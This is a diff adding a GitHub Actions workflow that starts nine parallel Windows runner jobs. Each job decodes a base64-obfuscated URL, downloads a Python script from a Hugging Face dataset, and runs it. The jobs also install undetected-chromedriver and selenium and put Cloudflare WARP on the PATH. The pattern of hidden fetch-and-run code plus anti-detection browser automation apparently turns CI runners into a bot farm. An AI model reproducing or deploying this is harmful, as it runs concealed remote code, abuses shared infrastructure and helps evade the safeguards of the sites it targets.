@@ -1,0 +1,70 @@
+name: Distributed Execution Network
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: net-cluster-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  orchestrate-nodes:
+    name: "Node-${{ matrix.node_num }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_num: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+
+    steps:
+      - name: Node Initialization and Resource Download
+        shell: bash
+        run: |
+          echo "[INIT] Bringing up node ${{ matrix.node_num }}..."
+          
+          # استخراج مسار التحميل من النص المشفر
+          DOWNLOAD_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$DOWNLOAD_LINK" -o app_task.py
+          
+          echo "[INIT] Installing all prerequisites..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[INIT] Node is operational."
+
+      - name: Worker Process and Runtime Supervisor
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Starting worker for Node-${{ matrix.node_num }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $RunConfig = @{
+              FilePath     = "python"
+              ArgumentList = "app_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $JobInstance = Start-Process @RunConfig
+          
+          Write-Output ">>> Oversight active. Max runtime is 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $JobInstance -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Job finished gracefully within the allowed period."
+          }
+          catch {
+              Write-Output ">>> Runtime limit hit! Killing the job..."
+              Stop-Process -InputObject $JobInstance -Force
+              Write-Output ">>> Job killed."
+          }
+
+      - name: Termination Acknowledgment
+        shell: bash
+        run: echo "[FIN] Node ${{ matrix.node_num }} has ended its operations."
